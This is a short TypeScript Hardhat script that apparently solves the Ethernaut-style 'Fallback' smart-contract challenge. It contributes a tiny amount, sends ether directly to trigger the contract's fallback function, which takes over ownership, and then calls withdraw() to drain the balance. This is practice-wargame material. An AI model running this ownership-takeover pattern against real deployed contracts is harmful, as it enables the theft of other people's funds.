import { HardhatRuntimeEnvironment } from 'hardhat/types';
import { DeployFunction, FacetCutAction } from 'hardhat-deploy/types';
import { ethers } from 'hardhat';
import { Fallback__factory} from '../../typechain-types';

const func:DeployFunction = async function (hre:HardhatRuntimeEnvironment) {
    const fallbackAddress = "0xdC5357A72cDF22F85048530fD2b288a13B4B0238"
    const amount = ethers.utils.parseEther("0.00000000001");


    console.log(">> Attach fallback contract");
    const Fallback = await ethers.getContractFactory("Fallback",(await ethers.getSigners())[0]) as Fallback__factory
    const fallback = Fallback.attach(fallbackAddress)
    console.log(">>>> owner ",await fallback.owner());
    await fallback.contribute({value:amount});
    console.log(">>>> user balance ",await fallback.getContribution());
    const res = (await ethers.getSigners())[0].sendTransaction({
        to: fallbackAddress,
        gasLimit: 5000000,
        value:amount
    });
    (await res).wait();
    console.log(">>>> user balance ",await fallback.getContribution());
    console.log(">>>> owner ",await fallback.owner());
    const withdrawRes = await fallback.withdraw();
    console.log("✅ Done");
}

export default func;
func.tags = ['Fallback'];